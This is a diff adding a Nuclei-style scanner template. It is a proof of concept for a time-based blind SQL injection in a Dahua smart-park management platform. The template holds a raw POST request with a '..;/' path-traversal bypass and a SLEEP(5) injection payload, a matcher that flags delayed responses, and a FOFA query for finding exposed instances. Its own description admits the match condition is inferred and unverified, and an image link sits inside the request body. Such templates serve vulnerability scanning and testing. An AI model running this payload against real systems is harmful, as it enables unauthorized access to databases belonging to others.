@@ -1,0 +1,39 @@
+id: poc-gkn83i3i1x1fdmcz
+info:
+  name: 大华-智慧园区综合管理平台 updateAccessChannelByVisit 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gkn83i3i1x1fdmcz
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gkn83i3i1x1fdmcz
+    fofa: app="dahua-智慧园区综合管理平台"
+http:
+- raw:
+  - 'POST /CardSolution/card/visitor/appointment/..;/..;/..;/card/accessControl/channel/updateAccessChannelByVisit HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Content-Length: 87
+
+    Content-Type: application/json
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1
+
+
+    {"channelCodes":["1'') OR (SELECT 8608 FROM (SELECT(SLEEP(5)))PemD) AND (''RyYI''=''RyYI"]}
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583190609-7327593f-a1c7-49b5-ba90-00877bf71137.png)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
